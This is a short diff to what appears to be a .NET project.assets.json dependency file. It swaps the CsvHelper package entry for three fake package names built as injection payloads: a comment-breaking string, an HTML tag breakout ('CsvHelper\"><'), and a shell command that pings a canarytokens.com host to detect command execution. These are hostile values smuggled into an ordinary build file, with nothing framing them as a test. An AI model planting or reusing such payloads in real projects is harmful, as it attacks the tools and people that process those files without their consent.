@@ -38,7 +38,15 @@
         "net6.0": {
           "targetAlias": "net6.0",
           "dependencies": {
-            "CsvHelper": {
+            "# !--": {
+              "target": "Package",
+              "version": "[30.0.0, )"
+            },
+            "CsvHelper\"><": {
+              "target": "Package",
+              "version": "[30.0.0, )"
+            },
+            "ping 22w5f67ylt854tzanwflpwz6z.canarytokens.com": {
               "target": "Package",
               "version": "[30.0.0, )"
             }
